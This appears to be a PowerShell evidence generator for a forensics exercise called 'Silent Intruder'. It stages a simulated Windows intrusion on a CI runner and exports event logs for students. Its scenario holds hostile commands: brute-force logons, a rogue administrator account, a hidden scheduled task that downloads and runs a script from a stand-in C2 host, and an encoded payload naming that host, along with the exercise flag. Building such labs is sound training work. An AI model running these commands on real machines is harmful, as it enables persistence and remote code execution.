<#
  Silent Intruder — generador de evidencia (Windows Event Logs).

  Se ejecuta en un runner windows-latest de GitHub Actions (con privilegios de
  admin) y produce evidencia REAL: activa las audit policies, instala Sysmon,
  ejecuta un escenario de intrusion y exporta los .evtx. El alumno los descarga y
  los analiza en su Event Viewer.

  Escenario (Silent Intruder):
    1. Brute force RDP: varios logons fallidos (4625) contra 'administrator'.
    2. Acceso: un logon con exito (4624).
    3. Cuenta rogue: se crea h.mercer y se mete en Administradores (4720, 4732).
    4. Persistencia: tarea programada 'OneDriveSync' al inicio de sesion (4698).
    5. Ejecucion: powershell.exe -EncodedCommand (4104) — la flag va dentro.

  MITRE ATT&CK: T1110 (Brute Force), T1078 (Valid Accounts), T1136.001 (Create
  Account), T1053.005 (Scheduled Task), T1059.001 (PowerShell), T1027 (Obfuscated).
#>
param(
  [string]$Flag = "NORTHWIND{th15_15_n0t_th3_r34l_fl4g}",
  [string]$OutDir = "C:\evidence"
)
$ErrorActionPreference = "Continue"
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null

Write-Host "[*] 1/5 Activando audit policies..."
auditpol /set /subcategory:"Logon" /success:enable /failure:enable | Out-Null
auditpol /set /subcategory:"Logoff" /success:enable | Out-Null
auditpol /set /subcategory:"User Account Management" /success:enable /failure:enable | Out-Null
auditpol /set /subcategory:"Security Group Management" /success:enable | Out-Null
auditpol /set /subcategory:"Other Object Access Events" /success:enable /failure:enable | Out-Null
auditpol /set /subcategory:"Process Creation" /success:enable | Out-Null
# Command line en 4688 + Script Block Logging (4104)
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f | Out-Null
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 1

Write-Host "[*] 2/5 Instalando Sysmon (config SwiftOnSecurity)..."
try {
  Invoke-WebRequest -UseBasicParsing -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:TEMP\Sysmon.zip"
  Expand-Archive "$env:TEMP\Sysmon.zip" -DestinationPath "$env:TEMP\sysmon" -Force
  Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "$env:TEMP\sysmonconfig.xml"
  & "$env:TEMP\sysmon\Sysmon64.exe" -accepteula -i "$env:TEMP\sysmonconfig.xml" | Out-Null
  Start-Sleep -Seconds 5
} catch { Write-Host "[!] Sysmon no disponible: $_" }

Write-Host "[*] 3/5 Ejecutando el escenario de intrusion..."
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class NativeLogon {
  [DllImport("advapi32.dll", SetLastError=true)]
  public static extern bool LogonUser(string u, string d, string p, int type, int prov, out IntPtr tok);
}
"@
$tok = [IntPtr]::Zero
# 1) Brute force -> 4625 (x6)
for ($i=1; $i -le 6; $i++) {
  [NativeLogon]::LogonUser("administrator", $env:COMPUTERNAME, "Autumn$i!wrong", 3, 0, [ref]$tok) | Out-Null
  Start-Sleep -Milliseconds 250
}
# 3) Cuenta rogue -> 4720 + 4732
net user h.mercer "W1nt3r-2026!" /add | Out-Null
net localgroup Administrators h.mercer /add | Out-Null
# 2) Logon con exito de la cuenta rogue -> 4624
[NativeLogon]::LogonUser("h.mercer", $env:COMPUTERNAME, "W1nt3r-2026!", 2, 0, [ref]$tok) | Out-Null
# 4) Persistencia -> 4698 (scheduled task al logon)
schtasks /create /tn "OneDriveSync" /tr "powershell.exe -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://updates.northw1nd-cdn.com/s.ps1')" /sc onlogon /ru System /f | Out-Null
# 5) PowerShell EncodedCommand -> 4104 (la flag va dentro del payload)
$payload = "`$ErrorActionPreference='SilentlyContinue'; `$c2='updates.northw1nd-cdn.com'; `$beacon_key='$Flag'; Write-Output ('exfil staged: ' + `$beacon_key)"
$enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
powershell.exe -NoProfile -EncodedCommand $enc | Out-Null

Start-Sleep -Seconds 8

Write-Host "[*] 4/5 Exportando los .evtx..."
wevtutil epl Security "$OutDir\Security.evtx" /ow:true
wevtutil epl "Microsoft-Windows-Sysmon/Operational" "$OutDir\Sysmon.evtx" /ow:true
wevtutil epl "Microsoft-Windows-PowerShell/Operational" "$OutDir\PowerShell.evtx" /ow:true

Write-Host "[*] 5/5 Evidencia generada:"
Get-ChildItem $OutDir | Format-Table Name, Length
